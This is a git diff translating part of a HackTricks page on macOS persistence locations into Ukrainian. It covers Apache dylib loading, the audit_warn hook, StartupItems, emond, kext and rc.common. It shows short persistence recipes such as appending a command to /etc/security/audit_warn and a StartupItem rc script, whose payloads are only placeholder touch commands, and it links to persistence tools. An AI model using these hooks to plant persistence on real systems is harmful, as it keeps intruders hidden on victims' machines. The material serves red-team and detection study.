-This way your compiled moduled will be loaded by Apache. The only thing is that either you need to **sign it with a valid Apple certificate**, or you need to **add a new trusted certificate** in the system and **sign it** with it.
+Цим чином ваші скомпільовані модулі будуть завантажені Apache. Єдине, що вам потрібно, це **підписати його дійсним сертифікатом Apple**, або вам потрібно **додати новий довірений сертифікат** в систему та **підписати його** ним.
 
-Then, if needed , to make sure the server will be started you could execute:
-
+Потім, якщо потрібно, щоб сервер запускався, ви можете виконати:
 ```bash
 sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
 ```
-
-Code example for the Dylb:
-
+Приклад коду для Dylb:
 ```objectivec
 #include <stdio.h>
 #include <syslog.h>
@@ -1524,47 +1440,44 @@ Code example for the Dylb:
 __attribute__((constructor))
 static void myconstructor(int argc, const char **argv)
 {
-     printf("[+] dylib constructor called from %s\n", argv[0]);
-     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
+printf("[+] dylib constructor called from %s\n", argv[0]);
+syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
 }
 ```
+### Каркас аудиту BSM
 
-### BSM audit framework
+Опис: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)
+* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Але вам потрібно мати права root, щоб auditd працював і викликав попередження
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * But you need to be root, auditd be running and cause a warning
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
-
-#### Location
+#### Місце
 
 * **`/etc/security/audit_warn`**
-  * Root required
-  * **Trigger**: When auditd detects a warning
+* Потрібні права root
+* **Тригер**: Коли auditd виявляє попередження
 
-#### Description & Exploit
+#### Опис та Використання
 
-Whenever auditd detects a warning the script **`/etc/security/audit_warn`** is **executed**. So you could add your payload on it.
-
+Кожного разу, коли auditd виявляє попередження, сценарій **`/etc/security/audit_warn`** **виконується**. Тому ви можете додати свій вредоносний код до нього.
 ```bash
 echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 ```
+Ви можете викликати попередження за допомогою `sudo audit -n`.
 
-You could force a warning with `sudo audit -n`.
-
-### Startup Items
+### Елементи автозапуску
 
 {% hint style="danger" %}
-**This is deprecated, so nothing should be found in those directories.**
+**Це застаріло, тому в цих каталогах не повинно бути нічого.**
 {% endhint %}
 
-The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:
+**StartupItem** - це каталог, який повинен бути розташований у `/Library/StartupItems/` або `/System/Library/StartupItems/`. Після створення цього каталогу в ньому повинні бути два конкретних файли:
 
-1. An **rc script**: A shell script executed at startup.
-2. A **plist file**, specifically named `StartupParameters.plist`, which contains various configuration settings.
+1. Сценарій **rc**: сценарій оболонки, який виконується при запуску.
+2. Файл **plist**, з назвою `StartupParameters.plist`, який містить різні налаштування конфігурації.
 
-Ensure that both the rc script and the `StartupParameters.plist` file are correctly placed inside the **StartupItem** directory for the startup process to recognize and utilize them.
+Переконайтеся, що як сценарій rc, так і файл `StartupParameters.plist` правильно розміщені всередині каталогу **StartupItem**, щоб процес завантаження міг їх впізнати та використовувати.
 
 {% tabs %}
 {% tab title="StartupParameters.plist" %}
@@ -1573,14 +1486,14 @@ Ensure that both the rc script and the `StartupParameters.plist` file are correc
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>Description</key>
-        <string>This is a description of this service</string>
-    <key>OrderPreference</key>
-        <string>None</string> <!--Other req services to execute before this -->
-    <key>Provides</key>
-    <array>
-        <string>superservicename</string> <!--Name of the services provided by this file -->
-    </array>
+<key>Description</key>
+<string>This is a description of this service</string>
+<key>OrderPreference</key>
+<string>None</string> <!--Other req services to execute before this -->
+<key>Provides</key>
+<array>
+<string>superservicename</string> <!--Name of the services provided by this file -->
+</array>
 </dict>
 </plist>
 ```
@@ -1592,15 +1505,15 @@ Ensure that both the rc script and the `StartupParameters.plist` file are correc
 . /etc/rc.common
 
 StartService(){
-    touch /tmp/superservicestarted
+touch /tmp/superservicestarted
 }
 
 StopService(){
-    rm /tmp/superservicestarted
+rm /tmp/superservicestarted
 }
 
 RestartService(){
-    echo "Restarting"
+echo "Restarting"
 }
 
 RunService "$1"
@@ -1611,50 +1524,47 @@ RunService "$1"
 ### ~~emond~~
 
 {% hint style="danger" %}
-I cannot find this component in my macOS so for more info check the writeup
+Я не можу знайти цей компонент у моєму macOS, тому для отримання додаткової інформації перевірте опис
 {% endhint %}
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)
 
-Introduced by Apple, **emond** is a logging mechanism that seems to be underdeveloped or possibly abandoned, yet it remains accessible. While not particularly beneficial for a Mac administrator, this obscure service could serve as a subtle persistence method for threat actors, likely unnoticed by most macOS admins.
+Представлений Apple, **emond** - це механізм журналювання, який, схоже, є недорозвиненим або, можливо, залишеним без уваги, але залишається доступним. Хоча цей невідомий сервіс не є особливо корисним для адміністратора Mac, він може слугувати як тонкий метод постійності для зловмисників, ймовірно, непомічений більшістю адміністраторів macOS.
 
-For those aware of its existence, identifying any malicious usage of **emond** is straightforward. The system's LaunchDaemon for this service seeks scripts to execute in a single directory. To inspect this, the following command can be used:
-
+Для тих, хто знає про його існування, виявлення будь-якого зловживання **emond** досить просте. LaunchDaemon системи для цієї служби шукає сценарії для виконання у одній папці. Для перевірки цього можна використати наступну команду:
 ```bash
 ls -l /private/var/db/emondClients
 ```
-
 ### ~~XQuartz~~
 
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)
 
-#### Location
+#### Місце розташування
 
 * **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
-  * Root required
-  * **Trigger**: With XQuartz
+* Потрібні права адміністратора
+* **Спрацьовує**: З XQuartz
 
-#### Description & Exploit
+#### Опис та Використання
 
-XQuartz is **no longer installed in macOS**, so if you want more info check the writeup.
+XQuartz **більше не встановлюється в macOS**, тому, якщо вам потрібна більш детальна інформація, перегляньте опис.
 
 ### ~~kext~~
 
 {% hint style="danger" %}
-It's so complicated to install kext even as root taht I won't consider this to escape from sandboxes or even for persistence (unless you have an exploit)
+Так складно встановити kext навіть як адміністратор, що я не розгляну це як можливість виходу з пісочниці або навіть для постійності (якщо у вас немає експлойту)
 {% endhint %}
 
-#### Location
+#### Місце розташування
 
-In order to install a KEXT as a startup item, it needs to be **installed in one of the following locations**:
+Для встановлення KEXT як елемента автозапуску, його потрібно **встановити в одному з наступних місць**:
 
 * `/System/Library/Extensions`
-  * KEXT files built into the OS X operating system.
+* Файли KEXT, вбудовані в операційну систему OS X.
 * `/Library/Extensions`
-  * KEXT files installed by 3rd party software
+* Файли KEXT, встановлені стороннім програмним забезпеченням
 
-You can list currently loaded kext files with:
-
+Ви можете перелічити поточно завантажені файли kext за допомогою:
 ```bash
 kextstat #List loaded kext
 kextload /path/to/kext.kext #Load a new one based on path
@@ -1662,46 +1572,44 @@ kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
 kextunload /path/to/kext.kext
 kextunload -b com.apple.driver.ExampleBundle
 ```
-
-For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).
+Для отримання додаткової інформації про [**розширення ядра перевірте цей розділ**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).
 
 ### ~~amstoold~~
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)
 
-#### Location
+#### Місцезнаходження
 
 * **`/usr/local/bin/amstoold`**
-  * Root required
+* Потрібні права адміністратора
 
-#### Description & Exploitation
+#### Опис та експлуатація
 
-Apparently the `plist` from `/System/Library/LaunchAgents/com.apple.amstoold.plist` was using this binary while exposing a XPC service... the thing is that the binary didn't exist, so you could place something there and when the XPC service gets called your binary will be called.
+Здається, `plist` з `/System/Library/LaunchAgents/com.apple.amstoold.plist` використовував цей бінарний файл, викладаючи сервіс XPC... справа в тому, що бінарний файл не існував, тому ви могли помістити туди щось, і коли сервіс XPC буде викликаний, буде викликаний ваш бінарний файл.
 
-I can no longer find this in my macOS.
+Я більше не можу знайти це в моєму macOS.
 
 ### ~~xsanctl~~
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)
 
-#### Location
+#### Місцезнаходження
 
 * **`/Library/Preferences/Xsan/.xsanrc`**
-  * Root required
-  * **Trigger**: When the service is run (rarely)
+* Потрібні права адміністратора
+* **Тригер**: Коли сервіс запускається (рідко)
 
-#### Description & exploit
+#### Опис та експлуатація
 
-Apparently it's not very common to run this script and I couldn't even find it in my macOS, so if you want more info check the writeup.
+Здається, цей скрипт не дуже часто використовується, і я навіть не можу знайти його в моєму macOS, тому якщо ви хочете отримати більше інформації, перевірте опис.
 
 ### ~~/etc/rc.common~~
 
 {% hint style="danger" %}
-**This isn't working in modern MacOS versions**
+**Це не працює в сучасних версіях MacOS**
 {% endhint %}
 
-It's also possible to place here **commands that will be executed at startup.** Example os regular rc.common script:
-
+Також можна помістити тут **команди, які будуть виконуватися при запуску.** Приклад звичайного скрипту rc.common:
 ```bash
 #
 # Common setup for startup scripts.
@@ -1741,16 +1649,16 @@ PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; ex
 #
 CheckForNetwork()
 {
-    local test
+local test
 
-    if [ -z "${NETWORKUP:=}" ]; then
-	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
-	if [ "${test}" -gt 0 ]; then
-	    NETWORKUP="-YES-"
-	else
-	    NETWORKUP="-NO-"
-	fi
-    fi
+if [ -z "${NETWORKUP:=}" ]; then
+test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
+if [ "${test}" -gt 0 ]; then
+NETWORKUP="-YES-"
+else
+NETWORKUP="-NO-"
+fi
+fi
 }
 
 alias ConsoleMessage=echo
@@ -1760,25 +1668,25 @@ alias ConsoleMessage=echo
 #
 GetPID ()
 {
-    local program="$1"
-    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
-    local     pid=""
+local program="$1"
+local pidfile="${PIDFILE:=/var/run/${program}.pid}"
+local     pid=""
 
-    if [ -f "${pidfile}" ]; then
-	pid=$(head -1 "${pidfile}")
-	if ! kill -0 "${pid}" 2> /dev/null; then
-	    echo "Bad pid file $pidfile; deleting."
-	    pid=""
-	    rm -f "${pidfile}"
-	fi
-    fi
+if [ -f "${pidfile}" ]; then
+pid=$(head -1 "${pidfile}")
+if ! kill -0 "${pid}" 2> /dev/null; then
+echo "Bad pid file $pidfile; deleting."
+pid=""
+rm -f "${pidfile}"
+fi
+fi
 
-    if [ -n "${pid}" ]; then
-	echo "${pid}"
-	return 0
-    else
-	return 1
-    fi
+if [ -n "${pid}" ]; then
+echo "${pid}"
+return 0
+else
+return 1
+fi
 }
 
 #
@@ -1786,30 +1694,29 @@ GetPID ()
 #
 RunService ()
 {
-    case $1 in
-      start  ) StartService   ;;
-      stop   ) StopService    ;;
-      restart) RestartService ;;
-      *      ) echo "$0: unknown argument: $1";;
-    esac
+case $1 in
+start  ) StartService   ;;
+stop   ) StopService    ;;
+restart) RestartService ;;
+*      ) echo "$0: unknown argument: $1";;
+esac
 }
 ```
-
-## Persistence techniques and tools
+## Техніки та інструменти постійності
 
 * [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
 * [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
 
 </details>
